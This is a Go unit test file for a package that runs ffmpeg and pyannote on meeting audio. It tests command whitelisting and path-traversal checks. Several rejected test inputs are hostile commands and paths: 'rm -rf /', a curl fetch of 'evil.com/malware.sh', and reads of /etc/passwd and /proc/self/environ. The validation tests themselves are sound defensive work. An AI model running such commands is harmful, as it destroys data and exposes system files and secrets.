package dependency

import (
	"context"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ============================================================================
// Test Doubles (Fakes)
// ============================================================================

// FakeExecutor is a test double for unit testing DependencyClient and other components.
// It allows tests to control the behavior of command execution without actually
// running external processes.
type FakeExecutor struct {
	// ResponseToReturn is the preset response returned by ExecuteCommand.
	ResponseToReturn CommandResponse

	// ErrorToReturn is the preset error returned by ExecuteCommand and HealthCheck.
	ErrorToReturn error

	// ExecutedCommands records all commands that were executed, for assertion purposes.
	ExecutedCommands []CommandRequest

	// HealthCheckCalled tracks whether HealthCheck was called.
	HealthCheckCalled bool
}

// ExecuteCommand records the command and returns the preset response/error.
func (f *FakeExecutor) ExecuteCommand(ctx context.Context, req CommandRequest) (CommandResponse, error) {
	f.ExecutedCommands = append(f.ExecutedCommands, req)
	return f.ResponseToReturn, f.ErrorToReturn
}

// HealthCheck records the call and returns the preset error.
func (f *FakeExecutor) HealthCheck(ctx context.Context) error {
	f.HealthCheckCalled = true
	return f.ErrorToReturn
}

// ============================================================================
// DependencyClient Tests
// ============================================================================

func TestDependencyClient_ConvertAudio_Success(t *testing.T) {
	// Arrange: Create a fake executor with successful response
	fakeExec := &FakeExecutor{
		ResponseToReturn: CommandResponse{
			Success:  true,
			ExitCode: 0,
			Stdout:   "conversion successful",
			Duration: 500 * time.Millisecond,
		},
	}

	config := ExecutorConfig{
		Mode:             ModeLocal,
		SharedVolumePath: "/data",
		DefaultTimeout:   5 * time.Minute,
		AllowedCommands:  []string{"ffmpeg"},
	}

	client := &DependencyClient{
		executor:    fakeExec,
		config:      config,
		pathManager: NewPathManager("/data"),
	}

	// Act: Convert audio
	err := client.ConvertAudio(context.Background(), "/data/input/test.webm", "/data/output/test.wav")

	// Assert: No error and correct command was executed
	assert.NoError(t, err)
	require.Len(t, fakeExec.ExecutedCommands, 1)

	cmd := fakeExec.ExecutedCommands[0]
	assert.Equal(t, "ffmpeg", cmd.Command)
	assert.Contains(t, cmd.Args, "-i")
	assert.Contains(t, cmd.Args, "/data/input/test.webm")
	assert.Contains(t, cmd.Args, "-ar")
	assert.Contains(t, cmd.Args, "16000")
	assert.Contains(t, cmd.Args, "-ac")
	assert.Contains(t, cmd.Args, "1")
	assert.Contains(t, cmd.Args, "/data/output/test.wav")
}

func TestDependencyClient_ConvertAudio_Failure(t *testing.T) {
	// Arrange: Create a fake executor with error response
	fakeExec := &FakeExecutor{
		ResponseToReturn: CommandResponse{
			Success:  false,
			ExitCode: 1,
			Stderr:   "FFmpeg error: invalid input format",
			Duration: 100 * time.Millisecond,
		},
	}

	config := ExecutorConfig{
		Mode:             ModeLocal,
		SharedVolumePath: "/data",
		DefaultTimeout:   5 * time.Minute,
	}

	client := &DependencyClient{
		executor:    fakeExec,
		config:      config,
		pathManager: NewPathManager("/data"),
	}

	// Act: Convert audio
	err := client.ConvertAudio(context.Background(), "/data/input/test.webm", "/data/output/test.wav")

	// Assert: Error is returned with stderr details
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "exit code 1")
	assert.Contains(t, err.Error(), "FFmpeg error: invalid input format")
}

func TestDependencyClient_ConvertAudio_ExecutorError(t *testing.T) {
	// Arrange: Create a fake executor that returns an error
	fakeExec := &FakeExecutor{
		ErrorToReturn: errors.New("network timeout: connection refused"),
	}

	config := ExecutorConfig{
		Mode:             ModeRemote,
		SharedVolumePath: "/data",
		DefaultTimeout:   5 * time.Minute,
	}

	client := &DependencyClient{
		executor:    fakeExec,
		config:      config,
		pathManager: NewPathManager("/data"),
	}

	// Act: Convert audio
	err := client.ConvertAudio(context.Background(), "/data/input/test.webm", "/data/output/test.wav")

	// Assert: Error is wrapped properly
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "audio conversion failed")
	assert.Contains(t, err.Error(), "network timeout")
}

func TestDependencyClient_RunDiarization_Success(t *testing.T) {
	// Arrange: Create a fake executor with successful response
	fakeExec := &FakeExecutor{
		ResponseToReturn: CommandResponse{
			Success:  true,
			ExitCode: 0,
			Stdout:   `{"segments": [{"start": 0.0, "end": 5.0, "speaker": "SPEAKER_00"}]}`,
			Duration: 30 * time.Second,
		},
	}

	config := ExecutorConfig{
		Mode:             ModeLocal,
		SharedVolumePath: "/data",
		DefaultTimeout:   10 * time.Minute,
		AllowedCommands:  []string{"pyannote"},
	}

	client := &DependencyClient{
		executor:    fakeExec,
		config:      config,
		pathManager: NewPathManager("/data"),
	}

	// Act: Run diarization
	err := client.RunDiarization(context.Background(), "/data/meetings/123/audio.wav", "/data/meetings/123/diarization.json", 2)

	// Assert: No error and correct command was executed
	assert.NoError(t, err)
	require.Len(t, fakeExec.ExecutedCommands, 1)

	cmd := fakeExec.ExecutedCommands[0]
	assert.Equal(t, "pyannote", cmd.Command)
	assert.Contains(t, cmd.Args, "--audio")
	assert.Contains(t, cmd.Args, "/data/meetings/123/audio.wav")
	assert.Contains(t, cmd.Args, "--output")
	assert.Contains(t, cmd.Args, "/data/meetings/123/diarization.json")
	assert.Contains(t, cmd.Args, "--num-speakers")
	assert.Contains(t, cmd.Args, "2")
}

func TestDependencyClient_HealthCheck(t *testing.T) {
	// Arrange: Create a fake executor that passes health check
	fakeExec := &FakeExecutor{
		ErrorToReturn: nil,
	}

	config := ExecutorConfig{
		Mode:             ModeLocal,
		SharedVolumePath: "/data",
	}

	client := &DependencyClient{
		executor:    fakeExec,
		config:      config,
		pathManager: NewPathManager("/data"),
	}

	// Act: Health check
	err := client.HealthCheck(context.Background())

	// Assert: No error and health check was called
	assert.NoError(t, err)
	assert.True(t, fakeExec.HealthCheckCalled)
}

// ============================================================================
// LocalExecutor Tests (Table-Driven)
// ============================================================================

func TestLocalExecutor_ExecuteCommand(t *testing.T) {
	tests := []struct {
		name         string
		req          CommandRequest
		wantErr      bool
		wantExitCode int
		wantTimeout  bool
	}{
		{
			name: "成功执行 echo 命令",
			req: CommandRequest{
				Command: "echo",
				Args:    []string{"hello", "world"},
				Timeout: 5 * time.Second,
			},
			wantErr:      false,
			wantExitCode: 0,
		},
		{
			name: "命令不存在",
			req: CommandRequest{
				Command: "nonexistent_command_12345_xyz",
				Args:    []string{},
				Timeout: 5 * time.Second,
			},
			wantErr: true,
		},
		{
			name: "命令超时",
			req: CommandRequest{
				Command: "sleep",
				Args:    []string{"3"},
				Timeout: 100 * time.Millisecond,
			},
			wantErr:     true,
			wantTimeout: true,
		},
	}

	config := ExecutorConfig{
		Mode:             ModeLocal,
		SharedVolumePath: "/tmp",
		DefaultTimeout:   5 * time.Second,
	}
	executor := NewLocalExecutor(config)

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			resp, err := executor.ExecuteCommand(context.Background(), tt.req)

			if tt.wantErr {
				assert.Error(t, err)
				if tt.wantTimeout {
					// Accept both English and Chinese timeout messages
					errMsg := err.Error()
					hasTimeoutMsg := strings.Contains(errMsg, "超时") ||
						strings.Contains(errMsg, "timeout") ||
						strings.Contains(errMsg, "Timeout")
					assert.True(t, hasTimeoutMsg, "应该是超时错误,实际错误: %s", errMsg)
				}
			} else {
				assert.NoError(t, err)
				assert.Equal(t, tt.wantExitCode, resp.ExitCode)
				assert.True(t, resp.Success, "成功的命令应该返回 Success=true")
			}
		})
	}
}

func TestLocalExecutor_HealthCheck_AllBinariesAvailable(t *testing.T) {
	// Arrange: Use a command that exists on all systems
	config := ExecutorConfig{
		Mode: ModeLocal,
		LocalBinaryPaths: map[string]string{
			"echo": "echo", // Should be available in PATH
		},
	}
	executor := NewLocalExecutor(config)

	// Act: Health check
	err := executor.HealthCheck(context.Background())

	// Assert: No error
	assert.NoError(t, err)
}

func TestLocalExecutor_HealthCheck_BinaryNotFound(t *testing.T) {
	// Arrange: Use a non-existent binary
	config := ExecutorConfig{
		Mode: ModeLocal,
		LocalBinaryPaths: map[string]string{
			"fake": "/path/to/nonexistent/binary",
		},
	}
	executor := NewLocalExecutor(config)

	// Act: Health check
	err := executor.HealthCheck(context.Background())

	// Assert: Error is returned
	assert.Error(t, err)
	// Accept both English and Chinese "not available" messages
	errMsg := err.Error()
	hasUnavailableMsg := strings.Contains(errMsg, "不可用") ||
		strings.Contains(errMsg, "not available") ||
		strings.Contains(errMsg, "Not available")
	assert.True(t, hasUnavailableMsg, "错误消息应包含'不可用'或'not available',实际: %s", errMsg)
}

// ============================================================================
// PathManager Tests
// ============================================================================

func TestPathManager_GetChunkAudioPath(t *testing.T) {
	pm := NewPathManager("/data")

	tests := []struct {
		name       string
		meetingID  string
		chunkIndex int
		ext        string
		wantPath   string
	}{
		{
			name:       "第一个音频块 WAV",
			meetingID:  "meeting_123",
			chunkIndex: 0,
			ext:        "wav",
			wantPath:   "/data/meetings/meeting_123/chunk_0000.wav",
		},
		{
			name:       "第15个音频块 WEBM",
			meetingID:  "0925_NIEP例会",
			chunkIndex: 15,
			ext:        "webm",
			wantPath:   "/data/meetings/0925_NIEP例会/chunk_0015.webm",
		},
		{
			name:       "大索引音频块",
			meetingID:  "test",
			chunkIndex: 123,
			ext:        "mp3",
			wantPath:   "/data/meetings/test/chunk_0123.mp3",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gotPath := pm.GetChunkAudioPath(tt.meetingID, tt.chunkIndex, tt.ext)
			assert.Equal(t, tt.wantPath, gotPath)
		})
	}
}

func TestPathManager_GetChunkBasename(t *testing.T) {
	pm := NewPathManager("/data")

	tests := []struct {
		chunkIndex   int
		wantBasename string
	}{
		{0, "chunk_0000"},
		{5, "chunk_0005"},
		{15, "chunk_0015"},
		{123, "chunk_0123"},
		{9999, "chunk_9999"},
	}

	for _, tt := range tests {
		t.Run(fmt.Sprintf("index_%d", tt.chunkIndex), func(t *testing.T) {
			basename := pm.GetChunkBasename(tt.chunkIndex)
			assert.Equal(t, tt.wantBasename, basename)
		})
	}
}

func TestPathManager_ValidatePath_ValidPaths(t *testing.T) {
	pm := NewPathManager("/data")

	// Create test directory
	testDir := filepath.Join(os.TempDir(), "aidg_test_validate")
	defer os.RemoveAll(testDir)
	os.MkdirAll(testDir, 0755)

	// Use temp directory for testing
	pm = NewPathManager(testDir)

	testFile := filepath.Join(testDir, "meetings", "test", "test.txt")
	os.MkdirAll(filepath.Dir(testFile), 0755)
	os.WriteFile(testFile, []byte("test"), 0644)

	tests := []struct {
		name    string
		path    string
		wantErr bool
	}{
		{
			name:    "有效路径 - 在共享卷内",
			path:    filepath.Join(testDir, "meetings", "test", "test.txt"),
			wantErr: false,
		},
		{
			name:    "无效路径 - 包含 ..",
			path:    testDir + "/meetings/../etc/passwd", // Don't use filepath.Join to preserve ".."
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := pm.ValidatePath(tt.path)
			if tt.wantErr {
				assert.Error(t, err)
			} else {
				// Only check if file exists in temp dir
				if _, statErr := os.Stat(tt.path); statErr == nil {
					assert.NoError(t, err)
				}
			}
		})
	}
}

func TestPathManager_EnsureMeetingDir(t *testing.T) {
	// Use temp directory for testing
	testBaseDir := filepath.Join(os.TempDir(), "aidg_test_ensure_dir")
	defer os.RemoveAll(testBaseDir)

	pm := NewPathManager(testBaseDir)

	// Act: Ensure meeting directory
	meetingID := "test_meeting_789"
	dir, err := pm.EnsureMeetingDir(meetingID)

	// Assert: Directory was created
	assert.NoError(t, err)
	assert.Equal(t, filepath.Join(testBaseDir, "meetings", meetingID), dir)

	// Verify directory exists
	info, statErr := os.Stat(dir)
	assert.NoError(t, statErr)
	assert.True(t, info.IsDir())
}

// ============================================================================
// ValidateCommandRequest Tests
// ============================================================================

func TestValidateCommandRequest_Whitelist(t *testing.T) {
	config := ExecutorConfig{
		SharedVolumePath: "/data",
		AllowedCommands:  []string{"ffmpeg", "pyannote"},
	}

	tests := []struct {
		name    string
		req     CommandRequest
		wantErr bool
	}{
		{
			name: "允许的命令 - ffmpeg",
			req: CommandRequest{
				Command: "ffmpeg",
				Args:    []string{"-i", "input.wav"},
			},
			wantErr: false,
		},
		{
			name: "允许的命令 - pyannote",
			req: CommandRequest{
				Command: "pyannote",
				Args:    []string{"--audio", "test.wav"},
			},
			wantErr: false,
		},
		{
			name: "不允许的命令 - rm",
			req: CommandRequest{
				Command: "rm",
				Args:    []string{"-rf", "/"},
			},
			wantErr: true,
		},
		{
			name: "不允许的命令 - curl",
			req: CommandRequest{
				Command: "curl",
				Args:    []string{"https://evil.com/malware.sh"},
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommandRequest(tt.req, config)
			if tt.wantErr {
				assert.Error(t, err)
				// Accept both English and Chinese messages
				errMsg := err.Error()
				hasWhitelistMsg := strings.Contains(errMsg, "不在白名单中") ||
					strings.Contains(errMsg, "not in whitelist") ||
					strings.Contains(errMsg, "whitelist")
				assert.True(t, hasWhitelistMsg, "错误应包含白名单相关消息,实际: %s", errMsg)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestValidateCommandRequest_PathTraversal(t *testing.T) {
	config := ExecutorConfig{
		SharedVolumePath: "/data",
		AllowedCommands:  []string{"ffmpeg"},
	}

	tests := []struct {
		name    string
		req     CommandRequest
		wantErr bool
		errMsg  string
	}{
		{
			name: "安全参数 - 正常文件路径",
			req: CommandRequest{
				Command: "ffmpeg",
				Args:    []string{"-i", "/data/meetings/123/input.wav", "/data/meetings/123/output.wav"},
			},
			wantErr: false,
		},
		{
			name: "危险参数 - 包含 ..",
			req: CommandRequest{
				Command: "ffmpeg",
				Args:    []string{"-i", "/data/meetings/../etc/passwd"},
			},
			wantErr: true,
			errMsg:  "危险字符",
		},
		{
			name: "危险参数 - 访问系统目录 /etc",
			req: CommandRequest{
				Command: "ffmpeg",
				Args:    []string{"-i", "/etc/passwd"},
			},
			wantErr: true,
			errMsg:  "系统目录",
		},
		{
			name: "危险参数 - 访问系统目录 /sys",
			req: CommandRequest{
				Command: "ffmpeg",
				Args:    []string{"-i", "/sys/kernel/debug"},
			},
			wantErr: true,
			errMsg:  "系统目录",
		},
		{
			name: "危险参数 - 访问系统目录 /proc",
			req: CommandRequest{
				Command: "ffmpeg",
				Args:    []string{"-i", "/proc/self/environ"},
			},
			wantErr: true,
			errMsg:  "系统目录",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommandRequest(tt.req, config)
			if tt.wantErr {
				assert.Error(t, err)
				// Accept both English and Chinese error messages
				errMsg := err.Error()
				hasExpectedMsg := strings.Contains(errMsg, tt.errMsg) ||
					strings.Contains(errMsg, "dangerous") ||
					strings.Contains(errMsg, "system directory") ||
					strings.Contains(errMsg, "traversal")
				assert.True(t, hasExpectedMsg, "错误应包含预期消息,期望包含'%s',实际: %s", tt.errMsg, errMsg)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

func TestValidateCommandRequest_WorkingDir(t *testing.T) {
	// Use temp directory for testing
	testBaseDir := filepath.Join(os.TempDir(), "aidg_test_workdir")
	defer os.RemoveAll(testBaseDir)
	os.MkdirAll(filepath.Join(testBaseDir, "meetings", "test"), 0755)

	config := ExecutorConfig{
		SharedVolumePath: testBaseDir,
		AllowedCommands:  []string{"ffmpeg"},
	}

	tests := []struct {
		name    string
		req     CommandRequest
		wantErr bool
	}{
		{
			name: "有效工作目录 - 在共享卷内",
			req: CommandRequest{
				Command:    "ffmpeg",
				Args:       []string{"-i", "input.wav"},
				WorkingDir: filepath.Join(testBaseDir, "meetings", "test"),
			},
			wantErr: false,
		},
		{
			name: "无效工作目录 - 包含 ..",
			req: CommandRequest{
				Command:    "ffmpeg",
				Args:       []string{"-i", "input.wav"},
				WorkingDir: filepath.Join(testBaseDir, "..", "etc"),
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommandRequest(tt.req, config)
			if tt.wantErr {
				assert.Error(t, err)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// ============================================================================
// NewClient Tests
// ============================================================================

func TestNewClient_ValidModes(t *testing.T) {
	tests := []struct {
		name    string
		mode    ExecutionMode
		wantErr bool
	}{
		{
			name:    "模式 local",
			mode:    ModeLocal,
			wantErr: false,
		},
		{
			name:    "模式 remote",
			mode:    ModeRemote,
			wantErr: false,
		},
		{
			name:    "模式 fallback",
			mode:    ModeFallback,
			wantErr: false,
		},
		{
			name:    "无效模式",
			mode:    ExecutionMode("invalid_mode"),
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			config := ExecutorConfig{
				Mode:             tt.mode,
				SharedVolumePath: "/data",
				DefaultTimeout:   5 * time.Minute,
			}

			client, err := NewClient(config)

			if tt.wantErr {
				assert.Error(t, err)
				assert.Nil(t, client)
				assert.Contains(t, err.Error(), "invalid execution mode")
			} else {
				assert.NoError(t, err)
				assert.NotNil(t, client)
				assert.NotNil(t, client.executor)
				assert.NotNil(t, client.pathManager)
			}
		})
	}
}
